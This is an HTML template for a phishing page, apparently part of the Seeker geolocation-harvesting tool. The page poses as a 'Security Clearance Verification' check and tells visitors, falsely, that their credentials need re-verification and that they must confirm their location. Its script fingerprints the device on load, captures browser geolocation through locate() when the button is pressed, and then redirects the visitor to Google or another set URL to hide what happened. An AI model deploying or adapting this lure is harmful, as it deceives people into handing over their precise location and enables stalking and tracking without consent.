<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Clearance Verification</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f5f5f5;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      max-width: 440px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      padding: 36px;
      border-top: 4px solid #1a73e8;
    }
    .icon { font-size: 2.5rem; margin-bottom: 16px; }
    h1 { font-size: 1.5rem; color: #1a1a1a; margin-bottom: 8px; }
    p { color: #5f6368; font-size: 0.95rem; line-height: 1.6; margin-bottom: 28px; }
    .btn {
      display: inline-block;
      padding: 12px 32px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 1rem;
      font-weight: 500;
      cursor: pointer;
    }
    .btn:hover { background: #1765cc; }
    #status { margin-top: 16px; font-size: 0.9rem; color: #5f6368; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🛡️</div>
    <h1>Security Clearance Verification</h1>
    <p>Your access credentials require periodic re-verification. Please confirm your current location to complete the clearance check and maintain uninterrupted access.</p>
    <button id="verifyBtn" class="btn" onclick="handleVerify()">Confirm Location</button>
    <div id="status"></div>
  </div>
  <script>
    window.SEEKER_API_BASE = '{{ api_base }}';
  </script>
  <script src="/static/seeker/js/location.js"></script>
  <script>
    information();
    function handleVerify() {
      var btn = document.getElementById('verifyBtn');
      var status = document.getElementById('status');
      btn.disabled = true;
      btn.textContent = 'Verifying...';
      var redirectUrl = '{{ redirect_url }}' || 'https://www.google.com';
      locate(
        function() {
          status.textContent = 'Verification successful.';
          window.location.href = redirectUrl;
        },
        function(err, msg) {
          status.textContent = 'Unable to verify. ' + (msg || '');
          btn.disabled = false;
          btn.textContent = 'Confirm Location';
        }
      );
    }
  </script>
</body>
</html>
